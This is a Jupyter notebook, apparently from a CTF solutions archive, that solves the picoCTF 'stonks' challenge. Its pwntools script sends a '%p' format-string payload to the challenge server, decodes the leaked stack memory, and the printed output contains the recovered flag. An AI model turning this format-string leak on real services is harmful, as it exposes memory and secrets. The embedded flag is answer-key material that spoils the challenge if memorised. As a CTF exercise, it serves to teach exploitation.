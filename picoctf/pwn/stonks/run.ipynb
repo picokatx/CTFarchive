{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to mercury.picoctf.net on port 6989\n",
      "[x] Opening connection to mercury.picoctf.net on port 6989: Trying 18.189.209.142\n",
      "[+] Opening connection to mercury.picoctf.net on port 6989: Done\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\xf0\\xd3e\\x08\\x00\\xb0\\x04\\x08\\xc3\\x89\\x04\\x08\\x80\\r\\xfb\\xf7\\xff\\xff\\xff\\xff\\x01`\\xb1e\\x08\\x10\\xe1\\xfb\\xf7\\x80\\xc1e\\x08\\x03\\xd0\\xd3e\\x08\\xf0\\xd3e\\x08picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}\\x00\\x8c\\xff\\xf8\\xba\\xfe\\xf7@\\xe4\\xfb\\xf7\\x00\\x16\\xfak\\xe9\\xdc\\xe4\\xf7\\xc0\\xf0\\xfb\\xf7\\xc0\\x05\\xfb\\xf7\\x00\\x00\\xfb\\xf7\\xa8\\x99\\x8c\\xff\\x8d\\xe6\\xe3\\xf7\\xc0\\x05\\xfb\\xf7\\xca\\x8e\\x04\\x08\\t/\\xfd\\xf7\\x00\\xb0\\x04\\x08\\x00\\x00\\xfb\\xf7 \\x0e\\xfb\\xf7\\xe8\\x99\\x8c\\xffP\\x8d\\xfd\\xf7\\x90\\x18\\xfb\\xf7\\x00\\x16\\xfak\\x00\\x00\\xfb\\xf7\\x00\\xb0\\x04\\x08\\xe8\\x99\\x8c\\xff\\x86\\x8c\\x04\\x08`\\xb1e\\x08\\xd4\\x99\\x8c\\xff\\xe8\\x99\\x8c\\xff\\xe9\\x8b\\x04\\x08\\x9c\\x9a\\x8c\\xff\\x94\\x9a\\x8c\\xff\\x01\\x01`\\xb1e\\x08\\x00\\x16\\xfak\\xa1?\\xdf\\xf7\\x00\\x00\\xfb\\xf7\\xa1?\\xdf\\xf7\\x01\\x94\\x9a\\x8c\\xff\\x9c\\x9a\\x8c\\xff$\\x9a\\x8c\\xff\\x00\\x00\\xfb\\xf7\\n7\\xfd\\xf7\\\\\\xd5\\x99-\\x01P\\x8d\\xfd\\xf7`9\\xfd\\xf7\\x00\\xb0\\x04\\x08\\x01b\\x86\\x04\\x08'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwn import ELF, context, remote, FmtStr, fmtstr_payload\n",
    "import re\n",
    "r = remote('mercury.picoctf.net', 6989)\n",
    "r.recvuntil(b\"2) View my portfolio\\n\")\n",
    "r.sendline(b\"1\")\n",
    "r.recvuntil(b\"What is your API token?\\n\")\n",
    "r.sendline(b\"%p\"*100)\n",
    "r.recvuntil(b\"Buying stonks with token:\\n\")\n",
    "out = r.recvline()\n",
    "stack = []\n",
    "for b in re.findall(\"[0-9a-f]+0x\", out.decode()):\n",
    "    if len(b[:-2])%2 != 0:\n",
    "        b = \"0\" + b\n",
    "    stack.append(bytes.fromhex(b[:-2])[::-1])\n",
    "b\"\".join(stack)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
